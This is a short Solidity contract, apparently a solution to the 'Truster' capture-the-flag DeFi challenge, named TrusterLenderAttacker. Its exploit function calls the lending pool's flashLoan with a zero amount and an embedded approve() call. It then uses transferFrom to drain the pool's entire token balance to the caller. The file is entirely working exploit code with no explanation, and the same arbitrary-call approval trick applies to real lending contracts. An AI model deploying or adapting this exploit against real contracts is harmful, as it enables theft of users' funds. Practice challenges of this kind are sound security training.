// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/utils/Address.sol";
import "./TrusterLenderPool.sol";

import "hardhat/console.sol";

contract TrusterLenderAttacker {

    using Address for address;

    function exploit(address token, address ca) external {
        uint256 balance = IERC20(token).balanceOf(ca);
        console.log(balance);

        ca.functionCall(abi.encodeWithSignature(
            "flashLoan(uint256,address,address,bytes)",
            0,
            address(this),
            token,
            abi.encodeWithSignature(
                "approve(address,uint256)",
                address(this),
                balance
            )
        ));

        IERC20(token).transferFrom(ca, msg.sender, balance);
    }
}
